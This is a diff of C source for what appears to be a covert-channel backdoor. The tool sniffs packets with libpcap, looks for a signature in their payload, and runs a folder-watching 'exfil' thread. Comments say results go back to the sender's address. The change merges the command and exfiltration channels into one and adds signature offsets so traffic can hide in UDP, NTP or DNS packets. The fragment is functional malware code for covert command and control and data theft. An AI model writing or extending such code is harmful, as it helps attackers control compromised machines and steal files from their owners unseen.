@@ -16,7 +16,6 @@
 
 #define SRC_OFF 		28 // Source address, so we know where to send results
 #define PORT_OFF 		38 // Destination port, we'll reflect results back on the same port
-#define ETHER_IP_LEN	36	
 
 #define EVENT_SIZE (sizeof (struct inotify_event))
 #define BUF_LEN	(1024 * (EVENT_SIZE + 16))
@@ -30,18 +29,16 @@ struct exfil_pack
 	char  *folder;
 };
 
-int com_chan;
-int xfl_chan;
+int channel;
 
-void pcap_start(const char *fltr_str, uint32 ipaddr, char *folder, int cchan, int xchan)
+void pcap_start(const char *fltr_str, uint32 ipaddr, char *folder, int chan)
 {
 	pcap_t* nic;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pthread_t exfil_thread;
 	struct exfil_pack expack;
 
-	com_chan = cchan;
-	xfl_chan = xchan;
+	channel = chan;
 
 	// Setup Exfil Watch
 	expack.ipaddr = ipaddr;
@@ -78,11 +75,25 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	char type;
 	static char buf[MAX_LEN];
 	static int len = 0;
+	int sig_pos = ETHER_HEADER_LEN;
+
+	switch(channel)
+	{
+		case CHAN_UDP:
+			sig_pos += UDP_SIG;
+			break;
+		case CHAN_NTP:
+			sig_pos += NTP_SIG;
+			break;
+		case CHAN_DNS:
+			sig_pos += DNS_SIG;
+			break;
+	}
 
 	// Step 1: locate the payload portion of the packet
-	if (pkt_info->caplen - ETHER_IP_LEN <= 0)
+	if (pkt_info->caplen - sig_pos <= 0)
 			return;
-	ptr = (char *)(packet + ETHER_IP_LEN);
+	ptr = (char *)(packet + sig_pos);
 
 	// Step 2: check for signature
 	if(*ptr == SIGNTR)
